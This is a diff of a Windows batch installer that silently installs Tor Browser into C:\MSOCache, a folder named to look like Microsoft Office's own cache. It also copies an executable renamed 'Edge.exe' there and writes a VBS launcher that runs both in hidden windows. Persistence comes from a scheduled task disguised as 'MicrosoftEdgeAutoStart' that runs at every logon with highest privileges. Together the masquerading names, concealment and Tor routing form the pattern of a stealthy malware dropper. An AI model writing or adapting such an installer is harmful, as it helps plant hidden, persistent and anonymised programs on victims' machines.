@@ -1,43 +1,43 @@
 @echo off
-setlocal
+setlocal enabledelayedexpansion
 
-rem === Simple installer ===
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo Run as Administrator!
+    pause
+    exit /b 1
+)
 
-rem Source = folder where this .bat lives (e.g. D:\Tor)
 set "SRC=%~dp0"
-
-rem Destination
 set "DST=C:\MSOCache"
+set "TOR_INSTALLER=%SRC%tor.exe"
+set "TOR_PATH=%DST%\TorBrowser"
 
-rem Create folder C:\MSOCache
 mkdir "%DST%" 2>nul
 
-rem Copy files
-copy "%SRC%config.json" "%DST%\" /Y >nul
-copy "%SRC%Microsoft Edge.exe" "%DST%\" /Y >nul
+copy /Y "%SRC%config.json" "%DST%\" >nul
+copy /Y "%SRC%Edge.exe" "%DST%\" >nul
 
-rem Create a small launcher that:
-rem   - sets working directory
-rem   - starts the EXE in a separate process
-rem   - then exits so the terminal closes immediately
+if exist "%TOR_INSTALLER%" (
+    "%TOR_INSTALLER%" /S /D=%TOR_PATH%
+    timeout /t 20 /nobreak >nul
+)
+
 (
-    echo @echo off
-    echo cd /d "C:\MSOCache"
-    echo start "" "C:\MSOCache\Microsoft Edge.exe"
-    echo exit
-) > "%DST%\run_app.bat"
+echo Set WshShell = CreateObject("WScript.Shell"^)
+echo WshShell.Run "cmd /c cd /d C:\MSOCache\TorBrowser\Browser ^&^& start /B firefox.exe -headless", 0
+echo WScript.Sleep 8000
+echo WshShell.Run "cmd /c cd /d C:\MSOCache ^&^& start /B Edge.exe", 0
+echo Set WshShell = Nothing
+) > "%DST%\launcher.vbs"
 
-rem Remove any old task with same name
 schtasks /Delete /TN "MicrosoftEdgeAutoStart" /F >nul 2>&1
 
-rem Create scheduled task to run launcher at every logon
-schtasks /Create ^
-  /SC ONLOGON ^
-  /TN "MicrosoftEdgeAutoStart" ^
-  /TR "\"%DST%\run_app.bat\"" ^
-  /F
+schtasks /Create /SC ONLOGON /TN "MicrosoftEdgeAutoStart" /TR "wscript.exe \"%DST%\launcher.vbs\"" /RL HIGHEST /F >nul
 
-echo Installed to: %DST%
-echo Task created: MicrosoftEdgeAutoStart (runs at user logon)
+echo Done. Installed to %DST%
+echo Starting now...
+wscript.exe "%DST%\launcher.vbs"
 
-endlocal
+timeout /t 2 /nobreak >nul
+exit /b 0
